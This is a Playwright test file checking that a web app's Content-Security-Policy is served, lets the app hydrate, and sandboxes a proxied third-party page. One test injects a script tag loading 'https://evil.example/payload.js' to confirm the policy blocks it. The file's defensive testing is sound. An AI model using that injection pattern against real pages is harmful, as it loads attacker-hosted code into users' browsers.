/**
 * Does the app still WORK under the Content-Security-Policy the proxy sets?
 *
 * This exists because a CSP is the one change in this app that can look
 * perfectly correct in a header check and still break the site: block the
 * framework's inline bootstrap, and hydration dies — a page that renders and
 * then does nothing. A policy nobody loads in a browser is a guess; this
 * loads it and asserts the app is alive.
 *
 * What it asserts:
 *   1. The header is actually on the response (the policy exists at all).
 *   2. No CSP violation is reported by the browser — this is the real check:
 *      it covers every script/style/font/img the page actually requests.
 *   3. React hydrated — a server-rendered page that never hydrates passes a
 *      naive "did it render" check, so assert on something only React sets.
 *   4. The app is interactive (the upload button is clickable), which is what
 *      a hydration failure would silently cost.
 *   5. The OEB proxy path answers SANDBOXED (F2): an inline script injected
 *      into the /oeb-rates-page document must not execute there, with the
 *      identical probe as a positive control on `/`, and the app's own
 *      same-origin staleness fetch must still read a parseable body.
 */
import { test, expect } from '@playwright/test';

const BASE = process.env.SMOKE_BASE_URL ?? 'http://127.0.0.1:3100';

test.describe('Content-Security-Policy', () => {
  test('is present, and the app still hydrates under it', async ({ page }) => {
    const violations: string[] = [];
    page.on('console', (msg) => {
      const text = msg.text();
      // Chromium's CSP console messages. A violation here means the policy is
      // blocking something the page genuinely needs.
      if (/Content Security Policy|Refused to/i.test(text)) violations.push(text);
    });
    page.on('pageerror', (err) => {
      violations.push(`pageerror: ${err.message}`);
    });

    const response = await page.goto(`${BASE}/`, { waitUntil: 'networkidle' });
    expect(response).not.toBeNull();

    // 1. The policy is really being served.
    const csp = response!.headers()['content-security-policy'];
    expect(csp, 'no CSP header on /').toBeTruthy();
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("object-src 'none'");

    // The page rendered server-side.
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible();

    // 2. 3. Hydration actually happened. Without hydration the upload control
    // is inert and the error boundary never mounts; with it, this store-driven
    // UI reflects the empty-storage state.
    const uploadButton = page.getByRole('button', { name: /upload/i }).first();
    await expect(uploadButton).toBeVisible();

    // 4. And it is interactive, not just painted.
    await uploadButton.click();
    await expect(page.getByRole('dialog')).toBeVisible();
    await page.keyboard.press('Escape');

    // 2 (asserted last, over the whole session including the interactions).
    expect(
      violations,
      `CSP blocked something the page needs:\n${violations.join('\n')}`,
    ).toEqual([]);
  });

  test('blocks an injected external script — the property the policy is for', async ({ page }) => {
    // Listeners are attached BEFORE the injection; attached after, they see
    // nothing and the assertion is vacuous.
    //
    // Two signals, because neither is sufficient alone:
    //  - `response` is empty  … nothing actually arrived from the network.
    //    But that alone would also pass if `evil.example` merely failed to
    //    resolve, which would mean we tested DNS instead of the policy.
    //  - a CSP violation is reported … naming `script-src` as the directive
    //    that acted. That is what proves the POLICY is what refused it.
    //
    // `request` is deliberately NOT asserted: Chromium emits it for a
    // script whose load the CSP then cancels, so an empty `request` list is
    // the wrong expectation and was a bug here once.
    const responses: string[] = [];
    const violations: string[] = [];
    page.on('response', (r) => {
      if (r.url().includes('evil.example')) responses.push(`${r.status()} ${r.url()}`);
    });
    page.on('console', (msg) => {
      if (/Content Security Policy/i.test(msg.text())) violations.push(msg.text());
    });

    await page.goto(`${BASE}/`, { waitUntil: 'domcontentloaded' });

    // The threat model: a compromised third-party page proxied onto our origin
    // pulls in remote code. `script-src` names only this origin plus inline
    // frames, so this fetch has nowhere to come from.
    await page.evaluate(() => {
      const s = document.createElement('script');
      s.src = 'https://evil.example/payload.js';
      s.setAttribute('data-csp-probe', '1');
      document.body.appendChild(s);
    });
    await page.waitForTimeout(800);

    expect(violations.length, 'the policy never reported acting').toBeGreaterThan(0);
    const detail = violations.join('\n');
    expect(detail).toMatch(/script-src/);
    expect(detail).toMatch(/has been blocked/i);
    expect(responses, 'a response came back for a script the policy should have blocked').toEqual(
      [],
    );
  });

  test('serves /oeb-rates-page sandboxed — third-party inline script cannot run there', async ({
    page,
  }) => {
    // F2 (security assessment t_0d85b1f8): /oeb-rates-page answers oeb.ca's
    // HTML as a navigable document on this origin, and the app-wide policy
    // allows 'unsafe-inline' — so before the fix, OEB's 4 inline <script>
    // blocks executed here with this origin's localStorage in reach
    // (window.a2a_config / dataLayer / $buoop all became objects; proven in
    // a browser on 2026-11-09). The fix is a route-level
    // `Content-Security-Policy: sandbox; default-src 'none'` asserted by
    // src/app/oeb-rates-page/route.ts.
    //
    // The instrument has a POSITIVE CONTROL first: the identical probe run
    // on our own pages must execute, or "it did not run" below would say
    // nothing about the policy — a dead probe reads as a pass.
    const probe = async (): Promise<unknown> =>
      page.evaluate(() => {
        const s = document.createElement('script');
        s.textContent = 'window.__cspInlineProbe = 1';
        document.body.appendChild(s);
        return (window as unknown as Record<string, unknown>).__cspInlineProbe;
      });

    await page.goto(`${BASE}/`, { waitUntil: 'domcontentloaded' });
    expect(
      await probe(),
      'control: an inline script must still execute on / (the app depends on it)',
    ).toBe(1);

    // The staleness check's own path, from the page that actually makes it
    // (useRateStaleness runs on the app page, not on the OEB document): a
    // same-origin fetch still reads a body it can parse — live tables, or
    // the honest empty state when the upstream is unreachable. Done HERE,
    // not after the sandbox navigation: that document has an opaque origin,
    // so a fetch from it is a cross-origin request and would be refused by
    // CORS — which would test the wrong thing.
    const body = await page.evaluate(async () => {
      const res = await fetch('/oeb-rates-page');
      const text = await res.text();
      return {
        ok: res.ok,
        len: text.length,
        hasTable: text.includes('<table'),
        hasEmpty: text.includes('Rate schedule temporarily unavailable'),
      };
    });
    expect(body.ok, 'the staleness fetch no longer succeeds').toBe(true);
    expect(body.len, 'the staleness fetch returned an empty body').toBeGreaterThan(0);
    expect(body.hasTable || body.hasEmpty, `unparseable body shape: ${JSON.stringify(body)}`).toBe(
      true,
    );

    // The route fetches www.oeb.ca server-side on every hit, so give the
    // navigation more than the 30 s suite budget; the assertions below hold
    // whether upstream answers or the route degrades to its empty state.
    const response = await page.goto(`${BASE}/oeb-rates-page`, {
      waitUntil: 'domcontentloaded',
      timeout: 60_000,
    });
    expect(response, 'navigation to /oeb-rates-page produced no response').not.toBeNull();

    const csp = response!.headers()['content-security-policy'];
    expect(csp, 'no Content-Security-Policy on the OEB proxy response').toBeTruthy();
    expect(csp, `expected the hardening policy, got: ${csp}`).toContain('sandbox');
    expect(csp, `expected the hardening policy, got: ${csp}`).toContain("default-src 'none'");

    // THE PROPERTY: the same inline script that ran on / must NOT run here.
    expect(
      await probe(),
      'an inline script executed in the /oeb-rates-page document — the sandbox is not being enforced',
    ).toBeUndefined();

    // And the specific globals the assessment saw set. Vacuously true when
    // upstream is down (no OEB script exists to block) — the probe above is
    // the deterministic half; this names the finding's own evidence.
    const globals = await page.evaluate(() => {
      const w = window as unknown as Record<string, unknown>;
      return [typeof w.a2a_config, typeof w.dataLayer, typeof w.$buoop];
    });
    expect(globals, "oeb.ca's inline scripts created globals on our origin").toEqual([
      'undefined',
      'undefined',
      'undefined',
    ]);
  });
});